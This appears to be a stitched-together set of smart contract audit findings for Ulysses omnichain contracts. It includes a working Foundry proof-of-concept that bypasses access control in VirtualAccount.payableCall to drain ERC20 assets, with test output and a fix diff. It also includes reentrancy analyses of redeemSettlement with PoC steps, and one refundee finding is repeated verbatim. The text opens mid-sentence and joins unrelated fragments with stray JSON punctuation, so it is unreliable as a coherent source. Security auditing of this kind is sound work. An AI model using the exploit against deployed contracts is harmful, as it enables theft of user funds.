Without checking this flag, failed transactions may not revert as expected, leading to undesired state changes and potential loss of funds. The smart contract should be modified to handle the return values properly by checking the success flag and reverting the transaction if it is `false`.",

See also, the  method which utilizes the  modifier.  \nTherefore, an attacker can craft a call to e.g. `ERC20.transfer(...)` on behalf of the contract, like the  method does, while bypassing access control by executing the call via .  \n\nAs a consequence, all non-native assets of the `VirtualAccount` can be stolen by anyone causing a loss for its owner.\n\n## Proof of Concept\nAdd the *code* below as new test file `test/ulysses-omnichain/VirtualAccount.t.sol` and run it using `forge test -vv --match-contract VirtualAccountTest` in order to verify the above claims.\n\n```solidity\n//SPDX-License-Identifier: AGPL-3.0-only\npragma solidity ^0.8.0;\n\nimport {VirtualAccount} from \"@omni/VirtualAccount.sol\";\nimport {PayableCall} from \"@omni/interfaces/IVirtualAccount.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport \"./helpers/ImportHelper.sol\";\n\n\ncontract VirtualAccountTest is Test {\n\n    address public alice;\n    address public bob;\n\n    VirtualAccount public vAcc;\n\n    function setUp() public {\n        alice = makeAddr(\"Alice\");\n        bob = makeAddr(\"Bob\");\n\n        // create new VirtualAccount for user Alice and this test contract as mock local port\n        vAcc = new VirtualAccount(alice, address(this));\n    }\n\n    function testWithdrawERC20_AliceSuccess() public {\n        vm.prank(alice);\n        vAcc.withdrawERC20(address(this), 1); // caller is authorized\n    }\n\n    function testWithdrawERC20_BobFailure() public {\n        vm.prank(bob);\n        vm.expectRevert();\n        vAcc.withdrawERC20(address(this), 1); // caller is not authorized\n    }\n\n    function testWithdrawERC20_BobBypassSuccess() public {\n        PayableCall[] memory calls = new PayableCall[](1);\n        calls[0].target = address(this);\n        calls[0].callData = abi.encodeCall(ERC20.transfer, (bob, 1));\n\n        vm.prank(bob);\n        vAcc.payableCall(calls); // caller is not authorized but it does't matter\n    }\n\n\n    // mock VirtualAccount call to local port\n    function isRouterApproved(VirtualAccount _userAccount, address _router) external returns (bool) {\n        return false;\n    }\n    \n    // mock ERC20 token transfer\n    function transfer(address to, uint256 value) external returns (bool) {\n        console2.log(\"Transferred %s from %s to %s\", value, msg.sender, to);\n        return true;\n    }\n}\n```\n\nOutput:\n```shell\nRunning 3 tests for test/ulysses-omnichain/VirtualAccount.t.sol:VirtualAccountTest\n[PASS] testWithdrawERC20_AliceSuccess() (gas: 15428)\nLogs:\n  Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea\n\n[PASS] testWithdrawERC20_BobBypassSuccess() (gas: 18727)\nLogs:\n  Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C\n\n[PASS] testWithdrawERC20_BobFailure() (gas: 12040)\nTest result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.11ms\n```\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\n\nAdd the missing  modifier to the  method:\n\n```diff\ndiff --git a/src/VirtualAccount.sol b/src/VirtualAccount.sol\nindex f6a9134..49a679a 100644\n--- a/src/VirtualAccount.sol\n+++ b/src/VirtualAccount.sol\n@@ -82,7 +82,7 @@ contract VirtualAccount is IVirtualAccount, ERC1155Receiver {\n     }\n \n     /// @inheritdoc IVirtualAccount\n-    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {\n+    function payableCall(PayableCall[] calldata calls) public payable requiresApprovedCaller returns (bytes[] memory returnData) {\n         uint256 valAccumulator;\n         uint256 length = calls.length;\n         returnData = new bytes[](length);\n\n```\n\n\n\n## Assessed type\n\nAccess Control"

The function does not seem to have any protective measures against reentrancy attacks, like using the Checks-Effects-Interactions pattern, or using a reentrancy guard (such as OpenZeppelin's `ReentrancyGuard`). Additionally, the state updates or effects that should occur after the external call are not present in the provided snippet (which might occur elsewhere in the contract and are relevant to assessing the full reentrancy risk). Reentrancy can be an issue if the state is inconsistent at the time the external call is made and the untrusted contract could take advantage of this. Without additional context on the entire contract\u2014including knowledge of what state changes occur before this external call and what checks are performed before the function execution\u2014it\u2019s hard to definitively say what the impact might be, but with the given information, there's a clear risk of a reentrancy vulnerability in this code snippet.",

This is dangerous because the recipient Dapp on the BranchChain can have a different address or not exist on the Root Chain and therefore if a settlement fails it won't be able to be redeemed since the settlement owner is set as the refundee. Here is a scenario - \n1. dApp A  on a Branch Chain with (`address = 0xbeef`) initiates a  `CallOut(...) 0x01` with `OutputParams (0x01)` for the `RootRouter`\n2. `RootBridgeAgent` executor calls `MulticallRootRouter` `execute()` which then performs some number of arbitrary calls and gets the `OutputParams` assets into the `MulticallRootRouter`\n3. `MulticallRootRouter` attempts to bridge out the assets to the BranchChain and creates a settlement, passing the `recipient (address = 0xbeef)` but also sets the `refundee as (address = 0xbeef)`.\n4. If the settlement fails there is no guarantee that `0xbeef` is a known dApp on the Root Chain and the assets won't be able to be redeemed. \n```solidity\nfunction execute(bytes calldata encodedData, uint16) external payable override lock requiresExecutor {\n        // Parse funcId\n        bytes1 funcId = encodedData[0];\n\t\t\t\t\n\t\t\t\t// code ...\n            /// FUNC ID: 2 (multicallSingleOutput)\n        } else if (funcId == 0x02) {\n            // Decode Params\n            (\n                IMulticall.Call[] memory callData,\n                OutputParams memory outputParams,\n                uint16 dstChainId,\n                GasParams memory gasParams\n            ) = abi.decode(_decode(encodedData[1:]), (IMulticall.Call[], OutputParams, uint16, GasParams));\n\n            // Perform Calls\n            _multicall(callData);\n\n            // Bridge Out assets\n            _approveAndCallOut(\n                outputParams.recipient,\n                outputParams.recipient,\n                outputParams.outputToken,\n                outputParams.amountOut,\n                outputParams.depositOut,\n                dstChainId,\n                gasParams\n            );\n\t\n\t\t\t\t}\n// code ...\n    }\n```\n```solidity\nfunction _createSettlement(\n        uint32 _settlementNonce,\n        address payable _refundee,\n        address _recipient,\n        uint16 _dstChainId,\n        bytes memory _params,\n        address _globalAddress,\n        uint256 _amount,\n        uint256 _deposit,\n        bool _hasFallbackToggled\n    ) internal returns (bytes memory _payload) {\n        // code ...\n\n        // Update Setttlement\n        settlement.owner = _refundee;\n        settlement.recipient = _recipient;\n\n\t\t\t\t// code ...\n      \n    }\n```\n```solidity\nfunction redeemSettlement(uint32 _settlementNonce) external override lock {\n        // Get setttlement storage reference\n        Settlement storage settlement = getSettlement[_settlementNonce];\n\n        // Get deposit owner.\n        address settlementOwner = settlement.owner;\n\n        // Check if Settlement is redeemable.\n        if (settlement.status == STATUS_SUCCESS) revert SettlementRedeemUnavailable();\n        if (settlementOwner == address(0)) revert SettlementRedeemUnavailable();\n\n        // Check if Settlement Owner is msg.sender or msg.sender is the virtual account of the settlement owner.\n        if (msg.sender != settlementOwner) {\n            if (msg.sender != address(IPort(localPortAddress).getUserAccount(settlementOwner))) {\n                revert NotSettlementOwner();\n            }\n        }\n\t\t\t/// more code ...\n    }\n```\n\n## Tools Used\nManual Inspection\n## Recommended Mitigation Steps\nInclude an argument that enables users to specify the refundee when creating settlements without using a Virtual Account\n\n\n## Assessed type\n\nContext"

This is dangerous because the recipient Dapp on the BranchChain can have a different address or not exist on the Root Chain and therefore if a settlement fails it won't be able to be redeemed since the settlement owner is set as the refundee. Here is a scenario - \n1. dApp A  on a Branch Chain with (`address = 0xbeef`) initiates a  `CallOut(...) 0x01` with `OutputParams (0x01)` for the `RootRouter`\n2. `RootBridgeAgent` executor calls `MulticallRootRouter` `execute()` which then performs some number of arbitrary calls and gets the `OutputParams` assets into the `MulticallRootRouter`\n3. `MulticallRootRouter` attempts to bridge out the assets to the BranchChain and creates a settlement, passing the `recipient (address = 0xbeef)` but also sets the `refundee as (address = 0xbeef)`.\n4. If the settlement fails there is no guarantee that `0xbeef` is a known dApp on the Root Chain and the assets won't be able to be redeemed. \n```solidity\nfunction execute(bytes calldata encodedData, uint16) external payable override lock requiresExecutor {\n        // Parse funcId\n        bytes1 funcId = encodedData[0];\n\t\t\t\t\n\t\t\t\t// code ...\n            /// FUNC ID: 2 (multicallSingleOutput)\n        } else if (funcId == 0x02) {\n            // Decode Params\n            (\n                IMulticall.Call[] memory callData,\n                OutputParams memory outputParams,\n                uint16 dstChainId,\n                GasParams memory gasParams\n            ) = abi.decode(_decode(encodedData[1:]), (IMulticall.Call[], OutputParams, uint16, GasParams));\n\n            // Perform Calls\n            _multicall(callData);\n\n            // Bridge Out assets\n            _approveAndCallOut(\n                outputParams.recipient,\n                outputParams.recipient,\n                outputParams.outputToken,\n                outputParams.amountOut,\n                outputParams.depositOut,\n                dstChainId,\n                gasParams\n            );\n\t\n\t\t\t\t}\n// code ...\n    }\n```\n```solidity\nfunction _createSettlement(\n        uint32 _settlementNonce,\n        address payable _refundee,\n        address _recipient,\n        uint16 _dstChainId,\n        bytes memory _params,\n        address _globalAddress,\n        uint256 _amount,\n        uint256 _deposit,\n        bool _hasFallbackToggled\n    ) internal returns (bytes memory _payload) {\n        // code ...\n\n        // Update Setttlement\n        settlement.owner = _refundee;\n        settlement.recipient = _recipient;\n\n\t\t\t\t// code ...\n      \n    }\n```\n```solidity\nfunction redeemSettlement(uint32 _settlementNonce) external override lock {\n        // Get setttlement storage reference\n        Settlement storage settlement = getSettlement[_settlementNonce];\n\n        // Get deposit owner.\n        address settlementOwner = settlement.owner;\n\n        // Check if Settlement is redeemable.\n        if (settlement.status == STATUS_SUCCESS) revert SettlementRedeemUnavailable();\n        if (settlementOwner == address(0)) revert SettlementRedeemUnavailable();\n\n        // Check if Settlement Owner is msg.sender or msg.sender is the virtual account of the settlement owner.\n        if (msg.sender != settlementOwner) {\n            if (msg.sender != address(IPort(localPortAddress).getUserAccount(settlementOwner))) {\n                revert NotSettlementOwner();\n            }\n        }\n\t\t\t/// more code ...\n    }\n```\n\n## Tools Used\nManual Inspection\n## Recommended Mitigation Steps\nInclude an argument that enables users to specify the refundee when creating settlements without using a Virtual Account\n\n\n## Assessed type\n\nContext"

                "description": "The vulnerability in the provided code snippet is related to reentrancy. The `redeemSettlement` function interacts with an external contract (`IPort(localPortAddress).bridgeToRoot`) before it has finished its internal state updates, particularly before it deletes the settlement with `delete getSettlement[_settlementNonce];`. This can lead to a reentrancy attack if the `bridgeToRoot` function calls back into any of this contract's functions that modify its state.\n\nIn a reentrancy attack, an attacker can take advantage of the contract's state not being fully updated before the external call is made. Specifically, if the contract's state can be accessed again via a recursive call, this can lead to unexpected behavior, such as balances being deducted twice, or other functions being called when they should not be.\n\nThe function `bridgeToRoot` involves an interaction with an external contract, which is a point where an attacker could potentially gain control (if the external contract is malicious or can be exploited). Since the `redeemSettlement` function does not update the state (`delete getSettlement[_settlementNonce]`) before making these external calls, it is vulnerable to reentrancy.\n\nOne common way to prevent this kind of vulnerability is to update all the relevant states before calling external contracts. This pattern is known as the \"checks-effects-interactions\" pattern. Here, the state is checked (`if` conditions), effects (state modifications, such as `delete getSettlement[_settlementNonce]`) should be made, and only after that should any interactions with external contracts (`IPort(localPortAddress).bridgeToRoot`) occur.\n\nAdditionally, there is a `lock` modifier used in the function signature, which could potentially be a reentrancy guard. If properly implemented, this guard should prevent reentrancy for this function. However, without the implementation details of the `lock` modifier, we cannot be certain that it effectively mitigates the reentrancy risk. If the `lock` modifier is not implemented correctly to prevent reentrant calls, the vulnerability stands.\n\nTo properly assess whether the function is indeed vulnerable, further analysis of the `lock` modifier and its behavior would be needed. If the `lock` modifier already ensures no reentrancy for this function, then the reentrancy vulnerability may be mitigated. However, based on the given code segment alone, it is prudent to consider it vulnerable to reentrancy.",

This external call happens before the state variable `getSettlement[_settlementNonce]` is deleted. A malicious token contract could potentially re-enter `redeemSettlement` or other functions of the smart contract, leading to unexpected behavior, such as redeeming the settlement more than once or affecting other state changes.\n\nConsidering that the `lock` modifier is mentioned but not provided in the snippet, it is typically implemented to prevent reentrancy. If this modifier is correctly implemented, it might mitigate reentrancy attacks by ensuring no re-entry takes place during the execution of this function. Without the implementation details of this modifier, it's unclear whether it properly mitigates this risk.\n\nTo evaluate this susceptibility further, one would create a PoC as follows:\n\n1. Deploy a malicious token contract that calls back into `redeemSettlement` upon receiving an external call (e.g., from `bridgeToRoot`).\n2. Invoke `redeemSettlement` with a settlement nonce for a settlement owned by the malicious contract or an EOA controlling it.\n3. Observe whether the smart contract state allows for a second entry into `redeemSettlement` or other state-changing functions before the previous execution deletes the settlement. If it does, the smart contract is certainly vulnerable.\n\nA patch would be to ensure that all state changes are made before any external calls.
